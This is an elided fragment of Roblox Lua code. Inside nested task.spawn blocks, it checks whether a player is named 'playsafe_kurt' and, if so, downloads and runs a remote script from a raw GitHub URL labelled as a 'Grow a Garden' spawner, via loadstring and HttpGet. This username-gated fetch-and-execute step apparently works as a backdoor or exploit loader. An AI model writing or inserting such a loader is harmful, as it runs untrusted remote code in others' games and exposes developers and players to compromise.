...
task.spawn(function()
    ...
    task.spawn(function()
        ...
        if player and player.Name == "playsafe_kurt" then
            ...
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTER583/GROW-A-GARDEN-SPAWNER/1ad788a8184396020b186afbb4f612f06b41a7fe/INYAM-SCRIPTS.lua",true))()
        end
